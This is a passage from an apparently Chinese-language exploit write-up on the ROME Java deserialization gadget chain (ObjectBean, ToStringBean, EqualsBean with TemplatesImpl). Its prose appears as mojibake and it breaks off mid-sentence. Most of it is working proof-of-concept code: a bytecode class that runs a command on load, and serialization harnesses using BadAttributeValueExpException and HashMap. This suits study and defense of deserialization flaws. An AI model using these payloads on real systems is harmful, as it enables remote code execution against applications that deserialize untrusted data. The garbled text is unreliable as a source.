å…¥å‚æ•°çš„ï¼Œæ‰€ä»¥è°ƒç”¨çš„æ˜¯ToStringBeançš„ç¬¬ä¸€ä¸ªtoString()æ–¹æ³•ã€‚\nå¹¶ä¸”å¯ä»¥çœ‹å‡ºæœ€åè°ƒç”¨çš„æ˜¯ç¬¬äºŒä¸ªtoStringå¹¶ä¼ å…¥äº†prefixï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹é€”ä¸­æˆ‘ç”»çº¢çº¿ä¸¤æ®µä»£ç ï¼Œå…¶å®å°±æ˜¯è·å–æˆ‘ä¼ å…¥çš„ç±»å®ä¾‹çš„åå­—ã€‚çœ‹ä¸‹é¢ä»£ç å°±èƒ½çœ‹æ‡‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package org.example; public class Haha { public static void main(String[] args) throws Exception { String prefix; Haha _obj =new Haha(); String className = _obj.getClass().getName(); System.out.println(className); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); System.out.println(prefix); } } ç»“æœä¸ºï¼š\n1 2 org.example.Haha Haha åŸºæœ¬å°±çŸ¥é“äº†ï¼Œå°±æ˜¯ç”¨æ¥è·å–ç±»åçš„ã€‚\nâ€”â€”â€”â€”â€”â€”\nç°åœ¨æˆ‘ä»¬å†æ¥çœ‹ç¬¬äºŒä¸ªtoString()æ–¹æ³•ï¼Œé‡ç‚¹åˆ†æå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } 1.å…ˆçœ‹BeanIntrospector.getPropertyDescriptors(this._beanClass)ï¼Œæˆ‘ä»¬ç‚¹å¼€æºä»£ç çœ‹ä¸€ä¸‹ï¼š\nè¿™é‡Œç”¨åˆ°äº†_introspectedå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±ç›´æ¥å°†è¿™ä¸ªå˜é‡èµ‹å€¼ä¸ºäº†HashMapç±»çš„å®ä¾‹ã€‚ç»§ç»­çœ‹getPropertyDescriptorsæ–¹æ³•ï¼Œé€è¡Œæ¥çœ‹ï¼š\n1 PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass)); æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨HashMapçš„getæ–¹æ³•ï¼Œæ¥è·å–kclasså¯¹åº”çš„å€¼ã€‚\nå†æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬åœ¨å®ä¾‹åŒ–ObjectBeanæ—¶è°ƒç”¨çš„ToStringBeanç±»çš„æ„é€ æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œçš„kclasså¯¹åº”çš„_beanClassçš„ç±»å‹æ˜¯ä¸€ä¸ªClassç±»å¯¹è±¡ã€‚\nâ€”â€”â€”â€”â€”â€”\nç»§ç»­getPropertyDescriptorsæ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬å¹¶æ²¡æœ‰å¾€BeanIntrospectorçš„HashMapä¸­æ”¾å…¥ä»»ä½•å€¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„get()è¿”å›çš„è‚¯å®šæ˜¯nullã€‚\næ‰€ä»¥é¡ºç†æˆç« è¿›å…¥åˆ°ifè¯­å¥ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 if (descriptors == null) { descriptors = getPDs(klass); _introspected.put(klass, descriptors); } è¿™é‡Œä¼šå…ˆè°ƒç”¨getPDs()æ–¹æ³•ï¼Œç„¶åå†å°†è¿™ä¸ªkclasså’ŒgetPDsçš„ç»“æœputè¿›HasMapé‡Œå½¢æˆä¸€ä¸ªé”®å€¼å¯¹ã€‚\nç°åœ¨å†æ¥çœ‹è¿™é‡Œè°ƒç”¨çš„getPDs()ï¼š è¿™ä¸ªæ–¹æ³•å¤§æ¦‚å°±æ˜¯è·å–è¿™ä¸ªClasså¯¹è±¡æ‰€æœ‰çš„getterå’Œsetterç„¶åæ‰“åŒ…æˆæ•°ç»„è¿”å›ã€‚\næ‰€ä»¥è¿™ä¸ªæ–¹æ³•æœ€ç»ˆä¼šå°†è¿™ä¸ªClasså¯¹è±¡å’Œå®ƒçš„setterrå’Œgetteræ‰“åŒ…æˆé”®å€¼å¯¹æ”¾å…¥BeanIntrospectorç±»çš„HashMapä¸­ã€‚\næœ€åä¼šå°†è¿™ä¸ªæ•°ç»„è¿”å›ï¼š\næ‰€ä»¥è¿™é‡Œçš„getPropertyDescriptors()æ–¹æ³•å°±æ˜¯è·å–æˆ‘ä»¬ä¼ å…¥çš„Classå¯¹è±¡çš„getterå’Œsetteræ–¹æ³•ï¼Œé€»è¾‘è¿˜æ˜¯æŒºå¥½çœ‹æ‡‚çš„ï¼Œå¦‚æœHashMapä¸­æœ‰ç›¸å¯¹åº”çš„é”®å€¼å¯¹å°±ç›´æ¥ä»¥æ•°ç»„å½¢å¼è¿”å›setterå’Œgetteræ–¹æ³•ï¼Œæ²¡æœ‰çš„è¯å°±é‡æ–°æ‰¾ç„¶åè¿”å›ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\n2.ç»§ç»­çœ‹toString()æ–¹æ³•ï¼Œç°åœ¨å¾—åˆ°äº†ç»“æœï¼Œå‡è®¾æˆ‘ä»¬ä¼ å…¥çš„Classæœ‰getterå’Œsetterï¼Œé‚£ä¹ˆgetPropertyDescriptors()æ–¹æ³•è¿”å›çš„å°±ä¸ä¸ºnullï¼Œå³pdsä¸ä¸ºnullï¼ŒæˆåŠŸè¿›å…¥ifæ¡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } ç°åœ¨å°±æ˜¯é‡ç‚¹åˆ†æifè¯­å¥å†…çš„javaè¯­å¥äº†ã€‚\nå¯¹äºè¿™ä¸ªforå¾ªç¯ï¼Œåªè¦èƒ½è¿›å…¥ifè¯­å¥å°±èƒ½è¿›è¡Œè‡³å°‘ä¸€æ¬¡forå¾ªç¯ï¼ˆå› ä¸ºæ•°ç»„ä¸­åªè¦æœ‰ä¸€ä¸ªå€¼é‚£ä¹ˆlengthå°±ä¸º1ï¼‰ï¼Œç»§ç»­çœ‹åé¢çš„ä»£ç ï¼š ç„¶åè¿™é‡Œçš„ getReadMethod() æ–¹æ³•æ˜¯è·å–Classå¯¹è±¡çš„getteræ–¹æ³•ï¼Œå¦‚æœæ­£ç¡®è·å–åˆ°äº†getæ–¹æ³•ï¼Œåº”è¯¥å°±å¯ä»¥é€šè¿‡é‡Œé¢çš„ifæ¡ä»¶ï¼Œç„¶åå°±å¯ä»¥è°ƒç”¨åˆ°invokeæ–¹æ³•ï¼Œè¿™é‡Œçš„NO_PARAMSå˜é‡çš„å€¼ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå¦‚ä¸‹ï¼š è¿™é‡Œå¯ä»¥æŠŠnew Object[0]ç†è§£æˆç±»ä¼¼äºnullè¿™ç§ï¼Œç„¶åå°±å¯ä»¥æ­£å¸¸è°ƒç”¨getteræ–¹æ³•è·å–å€¼ã€‚\nç°åœ¨å°±å‡ºæ¥äº†ä¸€æ¡é“¾ï¼Œç±»ä¼¼CBé“¾è¿™ç§ï¼Œç°åœ¨å°±å¯ä»¥åˆ©ç”¨åˆ°TemplateImplç±»çš„getOutputProperties()æ–¹æ³•ï¼š è¿™æ ·å°±å¯ä»¥ç›´æ¥æ„é€ æ”»å‡»äº†ã€‚ç°åœ¨å°±å¯ä»¥å…ˆå»çœ‹æ”»å‡»æ„é€ çš„toStringéƒ¨åˆ†äº†.\nhashCode() å†ç²˜è¿‡æ¥ä¸€ä¸‹ObjectBeançš„æ„é€ æ–¹æ³•ï¼š\nè¿™é‡ŒObjectBeanç±»çš„hashCode()æ–¹æ³•æºç å¦‚ä¸‹ï¼š\nç„¶åä»ä¸Šé¢çš„åˆå§‹åŒ–æ–¹æ³•å¯ä»¥çœ‹å‡ºè¿™é‡Œä¼šè°ƒç”¨ _equalsBean å˜é‡å¯¹åº”çš„EqualsBeanç±»å®ä¾‹çš„beanHashCode() æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š è¿™é‡Œå°±åˆæ˜¯ä¸€ä¸ªè§¦å‘toString()æ–¹æ³•çš„åœ°æ–¹ï¼Œå¹¶ä¸”è¿™ä¸ªEqualsBeanç±»çš„_objå˜é‡æ˜¯å¯æ§çš„ï¼š å‰é¢çš„åˆ¤æ–­è¯­å¥å°±æ˜¯çœ‹æˆ‘ä¼ å…¥çš„å‚æ•°objæ˜¯å¦æ˜¯beanClassç±»çš„å®ä¾‹ï¼Œæ˜¯çš„è¯å°±è¿”å›trueï¼Œåä¹‹ä¾ç„¶ï¼Œç”±äº!ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„objéœ€è¦æ˜¯beanClassçš„å®ä¾‹ã€‚åªè¦æˆ‘ä»¬å°†è¿™é‡Œçš„Objåˆæ§åˆ¶ä¸ºä¸€ä¸ªæ¶æ„ObjectBeanç±»å®ä¾‹å³å¯ã€‚\nç°åœ¨å°±åˆå¯ä»¥æ„é€ ä¸€ä¸ªåˆ©ç”¨é“¾äº†ã€‚è¿™é‡Œæ˜¯ç”¨çš„HashMapæ¥æ„é€ ã€‚ç°åœ¨å°±å¯ä»¥ç›´æ¥å»çœ‹æ”»å‡»æ„é€ çš„hashCode()é‚£ä¸€æ­¥äº†ã€‚\nequals() åŒæ ·çš„å†æ¬¡æŠŠObjectBeanæ„é€ æ–¹æ³•ç²˜è¿‡æ¥ä¸€ä¸‹ï¼š ç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„equals()æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨EqualsBeanç±»çš„beanEquals()æ–¹æ³•ï¼Œæ–¹æ³•é‡ç‚¹æºç å¦‚ä¸‹ï¼š\nè¿™é‡Œçš„ä»£ç å’Œå‰é¢çš„toString()æ–¹æ³•å¤§ç›¸å¾„åº­ï¼Œè¿˜æ˜¯è·å–ä¸€ä¸ªç±»çš„getterå’Œsetteræ–¹æ³•ï¼Œç„¶åè°ƒç”¨invoke()æ–¹æ³•ã€‚\nç°åœ¨çš„æƒ³æ³•å°±æ˜¯å¯¹å‰é¢çš„ifæ¡ä»¶çš„åˆ¤æ–­ï¼Œå¦‚ä¸‹ï¼š å‰é¢å¾ˆå¥½è¿›ï¼Œä¸»è¦å°±æ˜¯æˆ‘é‡ç‚¹æ ‡æ³¨çš„åœ°æ–¹ã€‚è¿™é‡Œå°±æ˜¯è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„objæ˜¯ _beanClass çš„å®ä¾‹ã€‚è¿™ä¸ªç®€å•ï¼Œä¼ ä¸€ä¸ªimplè¿›å»å°±è¡Œã€‚\nå…ˆæ¥çœ‹æˆ‘ä»¬å¦‚ä½•è°ƒç”¨è¿™ä¸ªequals()æ–¹æ³•ã€‚æ­£å¥½æˆ‘ä»¬çš„CC7ä¸­å°±æœ‰åˆ©ç”¨åˆ°equals()æ–¹æ³•ã€‚è¿™é‡Œå°±æ˜¯ç”¨Hashtableç±»ã€‚\nåç»­å°±å¯ä»¥ç›´æ¥å»çœ‹æ”»å‡»æ„é€ äº†ã€‚\næ”»å‡»æ„é€  toString() å‰é¢è¯´çš„å·²ç»éå¸¸æ¸…æ¥šäº†ã€‚è¿˜æ˜¯æŒºç®€å•çš„ã€‚\né‚£ä¹ˆè¿˜æ˜¯åˆ©ç”¨åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚åŸºæœ¬ç›˜ï¼š Test.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaéƒ¨åˆ†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯æ¥å…¥é“¾å­ã€‚\nä¸»è¦å°±æ˜¯æƒ³åœ¨å“ªé‡Œå¯ä»¥è°ƒç”¨ObjectBeançš„toString()æ–¹æ³•ã€‚è€Œåœ¨CC5ä¸­ç”¨åˆ°çš„BadAttributeValueExpExceptionç±»ååºæ—¶å°±å¯ä»¥è°ƒç”¨åˆ°toStirngæ–¹æ³•ï¼ˆè¿™ä¸ªç±»ä½äºjavax.management.BadAttributeValueExpExceptionï¼‰ï¼š\nåœ¨CC5æˆ‘ä»¬å°±è¯´äº†è¿™é‡Œçš„valObjå…¶å®å¯¹åº”çš„å°±æ˜¯åºåˆ—åŒ–çš„å˜é‡valï¼Œæ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¿™ä¸ªå˜é‡ä¸ºObjectBean()å³å¯ï¼Œä½¿ç”¨åå°„æ¥æ›´æ”¹valçš„å€¼å³å¯ï¼Œé‚£ä¹ˆæ„é€ çš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(TemplatesImpl.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¼¹ä¸äº†ï¼Œç„¶åæˆ‘å»çœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œå‘ç°è¿™é‡Œä¸èƒ½ç”¨TemplatesImpl.classï¼Œè€Œæ˜¯Templates.classï¼Œå…³ç³»å¦‚ä¸‹ï¼š åœ¨Templates.classä¸­æœ‰ä¸ªæ¥å£ï¼Œé‡Œé¢å°±æœ‰æˆ‘ä»¬è¦åˆ©ç”¨çš„getOutputPropertiesï¼š\næ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Templates.classæ¥è·å–åˆ°è¿™ä¸ªgetteræ–¹æ³•ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä½¿ç”¨è¿™ä¸ªå‘¢ï¼Ÿæ˜æ˜é€»è¾‘ä¸Šæ²¡æœ‰é—®é¢˜ï¼ŒTemplatesImpl.classå°±æ˜¯æœ‰é—®é¢˜å‘¢ï¼Ÿ\nå…ˆç»™POCï¼Œç„¶åæˆ‘ä»¬å†è°ƒè¯•çœ‹çœ‹ã€‚\næ‰€ä»¥æœ€ç»ˆPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨æ¥è§£å†³ä¸€ä¸‹ä¹‹å‰çš„é—®é¢˜ã€‚æˆ‘æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nç¡®å®æˆåŠŸç›´æ¥è·å–åˆ°äº†æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„getOutputProperties()æ–¹æ³•ï¼Œä½†æ˜¯å½“æˆ‘å¦‚ä¸‹æ‰“æ–­ç‚¹ï¼š\nç„¶åè°ƒè¯•ï¼Œå‘ç°è¿™é‡Œå¹¶ä¸ä¼šè¿›å…¥åˆ°è¿™ä¸ªè¯­å¥ã€‚è¿™è®©æˆ‘æƒ³åˆ°äº†ä¹‹å‰CC5ä¸ªäººæ€è€ƒé‚£é‡Œçš„é—®é¢˜ï¼Œåœ¨æˆ‘ä»¬åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ—¶å€™ï¼Œç”±äºå…¶ä¸­çš„è¿‡ç¨‹ï¼Œå¯¼è‡´äº†åœ¨ä¸­é—´æŸä¸€æ­¥ç›´æ¥æŠ¥é”™é€€å‡ºã€‚\nç»“åˆè¿™ä¸ªï¼Œæˆ‘ä»¬æ¥æƒ³ä¸€ä¸‹å¦‚æœåˆ©ç”¨TemplatesImpl.classï¼Œå› ä¸ºTemplatesImpl.classä¸­çš„getterä¸æ­¢ä¸€ä¸ªï¼Œæ‰€ä»¥å…¶å®å¾ˆæœ‰å¯èƒ½åœ¨å…¶ä¸­æŸä¸ªgetterç›´æ¥æŠ¥é”™é€€å‡ºäº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡èƒ½æˆåŠŸåˆ©ç”¨åˆ°æƒ³ç”¨çš„getOutputProperties()æ–¹æ³•ã€‚\nç„¶åæˆ‘ä»¬å†ç”¨åŸå…ˆé”™è¯¯çš„TemplatesImpl.classè°ƒè¯•ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š å½“è°ƒç”¨åˆ°getStylesheetDOM()æ—¶ï¼Œinvokeé‚£é‡Œç¡®å®å°±ç›´æ¥æŠ¥é”™é€€å‡ºåˆ°catchéƒ¨åˆ†äº†ï¼š ã€‚è¿™ä¸ªgetStylesheetDOM()æ–¹æ³•å¦‚ä¸‹ï¼š â€”â€”â€”â€”â€”â€”\nOKï¼Œé—®é¢˜è§£å†³ã€‚\næ‰€ä»¥æ³¨æ„ï¼šåé¢è¿™é‡Œè®°åˆ°ç”¨Templates.classï¼Œè€Œä¸æ˜¯TemplatesImpl.classã€‚\nhashCode() è¿™é‡Œæ˜¯ç”¨çš„HashMapï¼Œä½†æ˜¯åŒæ ·çš„åº”è¯¥HashSetå’ŒHashtableä¹Ÿè¡Œï¼Œè¿™ä¸‰ä¸ªéƒ½æ˜¯ç”±hashCodeé“¾çš„ã€‚åˆ†æä¸€ä¸‹HashMapç±»ï¼š åŒæ ·çš„åŸºæœ¬ç›˜ï¼š\nTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯æ¥å…¥HashMapã€‚\nè¿˜æ˜¯å¾ˆç®€å•çš„ã€‚\nå°±æ˜¯ä¸ºäº†è§¦å‘æ¶æ„ObjectBeançš„toString()æ–¹æ³•ï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); HashMap hashMap = new HashMap(); ObjectBean x = new ObjectBean(ObjectBean.class,bean); hashMap.put(x,\u0026#34;fupanc\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºã€‚ï¼ˆåºåˆ—ä¸€ä¸ªï¼Œååºåˆ—åŒ–ä¸€ä¸ªï¼‰\nä½†æ˜¯å¥½åƒè¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œæ„æ€ä¸€ä¸‹ï¼Œå¦‚ä½•åœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼š\næ­£å¸¸æ¥è¯´è‚¯å®šä¼šåœ¨åºåˆ—åŒ–å‰çš„é‚£ä¸ªput()æ–¹æ³•ä¼šè°ƒç”¨ä¸€æ¬¡å®Œæ•´çš„é“¾ï¼Œé‚£é‡Œä¼šå¯¼è‡´å¼‚å¸¸è¾“å‡ºï¼Œæ‰€ä»¥å¹¶ä¸èƒ½æˆåŠŸåˆ©ç”¨ã€‚\nç°åœ¨æ¥çœ‹çœ‹åœ¨toString()æ–¹æ³•è·å–getterå¹¶è°ƒç”¨çš„ä»£ç 